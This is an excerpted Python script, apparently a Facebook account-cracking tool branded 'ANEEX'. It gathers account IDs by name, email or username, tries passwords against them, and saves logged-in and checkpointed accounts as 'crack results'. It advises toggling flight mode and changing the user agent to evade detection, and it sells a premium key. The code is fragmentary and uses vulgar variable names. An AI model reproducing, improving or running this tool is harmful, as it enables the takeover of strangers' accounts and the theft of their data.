...
try:
    rq = requests.get('https://raw.githubusercontent.com/Aneex12/AN33ẞ/main/ANEEX.txt').text
...
def banner():
        os.system("clear")
        os.system('echo -e "[1;93m(*)\x1b[1;95m Auther    : ANEEX RXJX \n \x1b[1;93m(*)\x1b[1;93m FB        : facebook.com/ANEEXAWAIX0011\n \x1b[1;93m(*)\x1b[1;95m Tool Name : AN33ẞ\n \x1b[1;93m(*)\x1b[1;91m Github    : https://github.com/ANEEX12  X\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : ANEEX,RXJX'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def dump_email():
    print("%s [%s•%s] %sEXAMPLE : ANEEXRXJX "%(H,P,H,K));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
...
def dump_username():
    print("%s [%s•%s] %sEXAMPLE : %sANEEX RXJX"%(H,P,H,K,H));_query_ = _cici_azimvau_("%s [%s•%s] %sENTER NAME : "%(H,P,H,K)).lower()
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sANEEX-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "ANEEX-OK/%s.txt"%(tanggal)
                    if fl.get("id") in files_ok:pass
                        ...
                        else:print("\r %s[%sANEEX-OK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("ANEEX-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("ANEEX-OK/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sANEEX-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("ANEEX-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("ANEEX-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sANEEX-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sANEEX-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sOK%s] IDS SAVED IN >> %sANEEX-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sCP%s] IDS SAVED IN >> %sANEEX-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
    psb('%s [%s•%s] %sON FLIGHT MODE FOR [5 SEC] EVERY 5 MINUTES\n'%(H,P,H,B))


def folder():
    try:os.mkdir("ANEEX-CP")
    except:pass
    try:os.mkdir("ANEEX-OK")
    except:pass
...
def genkey():
	try:
		...
		subprocess.check_output(["am", "start", "https://wa.me/+923156675789"])
		exit()
	except(IOError):
		rb = rx
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF ANEEX RXJX%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;91m.          PAYMENT CANT BE UNDONE")
		print("\033[0;91m.          CHANGE USER AGENT IF CP IDS CAME")
